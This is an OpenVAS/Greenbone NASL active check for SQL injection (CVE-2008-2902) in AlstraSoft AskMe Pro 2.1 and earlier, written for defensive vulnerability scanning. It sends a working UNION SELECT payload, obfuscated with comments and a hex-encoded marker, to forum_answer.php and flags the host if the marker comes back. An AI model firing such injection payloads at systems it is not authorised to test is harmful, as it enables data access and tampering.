# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100800");
  script_version("2021-11-23T01:39:52+0000");
  script_tag(name:"last_modification", value:"2021-11-23 01:39:52 +0000 (Tue, 23 Nov 2021)");
  script_tag(name:"creation_date", value:"2010-09-14 15:16:41 +0200 (Tue, 14 Sep 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2008-2902");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("AlstraSoft AskMe Pro <= 2.1 Multiple SQLi Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"AlstraSoft AskMe Pro is prone to multiple SQL injection (SQLi)
  vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in
  an SQL query.

  Exploiting these issues could allow an attacker to compromise the application, access or modify
  data, or exploit latent vulnerabilities in the underlying database.

  All versions up to and including AlstraSoft AskMe Pro 2.1 are vulnerable.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

foreach dir (make_list_unique("/", "/ask", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/forum_answer.php");
  if (res !~ "^HTTP/1\.[01] 200")
    continue;

  url = dir + "/forum_answer.php?que_id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,0x53514c2d496e6a656374696f6e2d54657374,6,7,8,9,10/**/FROM/**/expert/*";

  if (http_vuln_check(port: port,url: url,pattern: "SQL-Injection-Test")) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
